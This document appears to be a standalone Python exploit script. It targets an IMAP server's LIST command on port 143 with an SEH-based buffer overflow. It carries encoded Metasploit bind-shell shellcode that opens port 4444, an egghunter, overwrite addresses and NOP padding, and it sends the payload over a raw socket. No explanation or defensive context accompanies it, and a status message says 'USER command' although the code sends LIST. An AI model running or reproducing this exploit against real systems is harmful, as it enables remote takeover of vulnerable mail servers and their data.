#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip  = '192.168.10.101'
port= 143
cmd    = "02 LIST "
nop1    = "\x90" * 16
#badchar= "0x00 0x0a 0x0d 0x20 0x2f 0x3a 0x7b"
#win32_bind -  EXITFUNC=process LPORT=4444 Size=344 Encoder=ShikataGaNai http://metasploit.com
egg = ("\x31\xc9\xbf\x8d\x9a\x39\x3b\xb1\x51\xdb\xc8\xd9\x74\x24\xf4\x5a"
"\x31\x7a\x0e\x83\xc2\x04\x03\xf7\x90\xdb\xce\xfb\xcf\xf0\x7c\xeb"
"\xe9\xf8\x80\x14\x69\x8c\x13\xce\x4e\x19\xae\x32\x04\x61\x34\x32"
"\x1b\x75\xbd\x8d\x03\x02\x9d\x31\x35\xff\x6b\xba\x01\x74\x6a\x52"
"\x58\x4a\xf4\x06\x1f\x8a\x73\x51\xe1\xc1\x71\x5c\x23\x3e\x7d\x65"
"\xf7\xe5\x56\xec\x12\x6e\xf9\x2a\xdc\x9a\x60\xb9\xd2\x17\xe6\xe2"
"\xf6\xa6\x13\x1f\x2b\x22\x6a\x73\x17\x28\x0c\x48\x66\x8b\xaa\xc5"
"\xca\x1b\xb8\x99\xc0\xd0\xce\x05\x74\x6d\x6e\x3d\xd8\x1a\xe1\x73"
"\xea\x36\xad\x74\x24\xa0\x1d\xec\xa1\x1e\x90\x98\x46\x12\xe6\x07"
"\xfd\x2b\xd6\xdf\x36\x3e\x2b\x24\x99\x3e\x02\x05\x90\x24\xcd\x38"
"\x4f\xae\x10\x6f\xfa\xad\xeb\x5f\x92\x68\x1a\xaa\xce\xdc\xe2\x82"
"\x42\xb0\x4f\x79\x36\x75\x23\x3e\xeb\x86\x13\xa6\x63\x68\xc8\x40"
"\x27\x03\x11\x19\xaf\xb7\xc8\x51\xf7\xef\x13\x47\x9d\x1f\xbd\x32"
"\x9d\xf0\x55\x18\xcc\xdf\x4c\x37\xf0\xf6\xdc\xe2\xf1\x27\x8a\xe9"
"\x47\x4e\x02\xa6\xa8\x98\xc5\x1c\x03\x70\x19\x4c\x38\x12\x02\x15"
"\xf9\x9a\x9b\x1a\xd3\x08\xdb\x34\xba\xd8\x47\xd2\x2b\x7e\xe5\x93"
"\x49\xea\xa5\xfa\xb8\x27\xcc\x1b\xd0\xf3\x46\x01\x14\x3c\xab\x6f"
"\xa9\xfe\x61\x91\x14\xd3\xea\xe0\xe3\x13\xa6\x51\xb8\x0c\xca\x5b"
"\x0c\xda\xd5\xd6\x37\x1c\xff\x43\xef\xb0\x51\x22\x5e\x5f\x53\x95"
"\x31\xca\x02\xea\x62\x9c\x09\xcd\x86\x93\x01\x12\x5e\x41\x59\x13"
"\x68\x69\x75\x60\xc0\x69\xf5\xb2\x8b\x6e\x2c\x68\xab\x41\xb9\xf2"
"\x8b\x80\x49\x59\xd3\x93\x51\x8d")
junk    = "\x90" * (772-len("w00tw00t"+nop1+egg))
nseh    = "\xeb\x06\x90\x90"
seh    = "\x36\x03\x0E\x60"
nop2    = "\x90" * 8
hunter =("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
nop3 = "\x90" * 8
payload = (cmd+"w00tw00t"+nop1+egg+junk+nseh+seh+nop2+hunter+nop3)
residual= "}" * (2000-len(payload))
buffer  = (payload+residual)
s.connect((ip,port))
data=s.recv(1024)
print("sending evil data via USER command..")
s.send(buffer+"\r\n")
s.close()
print("Finish")
